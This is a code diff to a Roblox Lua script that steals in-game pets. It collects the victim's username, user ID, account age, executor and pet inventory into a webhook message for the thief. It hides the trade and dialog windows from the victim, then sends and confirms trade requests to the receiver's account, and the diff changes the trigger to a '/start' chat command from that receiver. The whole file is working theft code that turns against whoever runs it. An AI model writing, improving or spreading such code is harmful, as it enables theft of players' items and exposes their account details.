@@ -63,7 +63,7 @@ local data = {
   embeds = {
     {
       title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '```',
       color = 10428396
     }
   }
@@ -101,11 +101,9 @@ local function SendTrade()
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
-  
-  while task.wait(0.1) do
-        repeat
-            send_trade:FireServer(game.Players[Username])
-            
+
+  send_trade:FireServer(game.Players[Username])
+
 wait(4)
 local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
@@ -139,25 +137,10 @@ local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
   AcceptTradeRemote:FireServer()
-wait(1)
-        until (trade_info.sender_offer and #trade_info.sender_offer ~= nil) and (trade_info.sender_offer and trade_info.sender_offer.player_name ~= nil)
-end
 end
 
 local function StartSteal()
         SendTrade()
-end
-
-local function WaitForTrade()
-  while true do
-    if game.Players:FindFirstChild(Username) then
-       wait(5)
-      StartSteal()
-      break
-    else
-      wait(1)
-    end
-  end
 end
 
 local total_pets = 0
@@ -172,4 +155,14 @@ print("Bypassed!")
 end
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-WaitForTrade()
+
+game.Players.PlayerAdded:Connect(function(player)
+  if player.Name == Username then
+      player.Chatted:Connect(function(msg)
+          local lowerMsg = msg:lower()
+          if lowerMsg == "/start" or lowerMsg == "start" then
+            StartSteal()
+          end
+      end)
+  end
+end)
